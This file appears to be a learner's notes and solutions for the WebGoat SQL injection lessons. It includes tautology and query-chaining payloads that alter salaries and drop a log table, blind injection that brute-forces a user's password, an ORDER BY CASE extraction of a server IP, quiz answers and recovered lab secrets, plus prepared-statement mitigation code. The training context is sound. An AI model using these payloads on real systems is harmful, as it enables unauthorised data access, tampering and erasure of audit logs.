/* A1 - INJECTION */

/* INTRO */

-- #2 
SELECT department 
FROM employees 
WHERE first_name LIKE ‘Bob’ AND last_name LIKE ‘Franco’;

-- #3 DATA MANIPULATION LANGUAGE (DML)

UPDATE employees 
SET department = 'Sales' 
WHERE userid = 89762;

-- #4 DATA DEFINITION LANGUAGE (DFL)
ALTER TABLE employees
ADD phone varchar(20);

-- #5 DATA CONTROL LANGUAGE (DCL)
GRANT ALTER TABLE
TO UnauthorizedUser;

-- #6 WHAT IS SQL INJECTION
-- #7 CONSEQUENCES OF SQL INJECTION
-- #8 SEVERITY SQL INJECTION

-- #9 STRING SQL INJECTION
SELECT * FROM user_data
WHERE first_name = 'John' AND last_name = 'Smith'
OR '1' = '1';

-- #10 NUMERIC SQL INJECTION
SELECT * FROM user_data 
WHERE Login_Count = 0 AND userid = 1 OR 1=1;

-- #11 STRING SQL INJECTION
SELECT * FROM employees 
WHERE last_name = 'Smith' OR '1'='1'--

-- #12 QUERY CHAINING
-- Find employee salaries
'Smith' OR '1'='1'--
-- Set salary
'Smith'; 
UPDATE employees 
SET salary = 99999
WHERE auth_tan = '3SL99A';
DROP TABLE access_log;

-- #13 QUERY CHAINING 
-- drop the access_log table in #12 @_@

/* ADVANCED */

-- #3 UNION PASSWORD IS = passW0rD Cant figure out UNION )_)
'random';
SELECT * FROM user_system_data
WHERE user_name = 'random' OR '1' = '1'


-- #5 BLIND SQL INJECTION TRUE OR FALSE QUERIES
/* 
Register form provides useful feedback compared to the login form. So we should use register form instead
1. Register a new user: testone
2. Register again and verify: testone' OR '1'='1' essential returning TRUE. Should say user already exists
3. Register again and verify: testone' OR '1'='2' essential returning FALSE. Should say user created
4. Using the information above we can try to guess Tom's password by bruteforce: tom' AND substring(password,1,1)='t, tom' AND substring(password,2,1)='h
5. If the above statement returns user already exists = TRUE meaning the letter is correct. Otherwise false. Move on and choose the another letter, always doing the work
6. thisisasecretfortomonly
*/

-- #6 

/*
1. 4
2. 3
3. 2
4. 3
5. 4
*/

/* MITIGATION */

-- #5 WRITIING SAFE CODE PREPARED STATEMENTS
/*
getConnection
Preparedstatement statement
prepareStatement
?
?
statement.setString(1, "kevin")
statement.setString(2, "kevin@mail.com")

*/

-- #6 WRITIING SAFE CODE PREPARED STATEMENTS
try {  
     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
     ps.setString(1, "Kevin");  
     ResultSet results = ps.executeQuery();  
} catch (SQLException e) {  
     System.out.println("Oops. Something went wrong!");  
}

-- #10 FIND IP BY INTERCEPTING SERVER REQUEST AND INSERTING THE QUERY BELOW
-- Find out table name and column names: best guess server and ip
-- Verify, if table name and column name guess is correct it should order by id. Using BurpSite Send to Repeater then Modify PARAMS
column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-acc') = '192.168.3.3' THEN id ELSE hostname END)
-- Then start going through each string similar to Advance #5 Lesson
column=(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd' AND substring(ip,1,1) = '1') IS NOT NULL THEN hostname ELSE mac END)
-- convert the query to raw first by adding it to the parameter variable
-- TRUE = number is correct / ORDER is done by hostname
/* 
 {
  "id" : "3",
  "hostname" : "webgoat-acc",
  "ip" : "192.168.3.3",
  "mac" : "EF:12:FE:34:AA:CC",
  "status" : "offline",
  "description" : "Acceptance server"
}, {
  "id" : "1",
  "hostname" : "webgoat-dev",
  "ip" : "192.168.4.0",
  "mac" : "AA:BB:11:22:CC:DD",
  "status" : "online",
  "description" : "Development server"
}, {
  "id" : "4",
  "hostname" : "webgoat-pre-prod",
  "ip" : "192.168.6.4",
  "mac" : "EF:12:FE:34:AA:CC",
  "status" : "offline",
  "description" : "Pre-production server"
}, {
  "id" : "2",
  "hostname" : "webgoat-tst",
  "ip" : "192.168.2.1",
  "mac" : "EE:FF:33:44:AB:CD",
  "status" : "online",
  "description" : "Test server"
} ]
*/
104.130.219.202




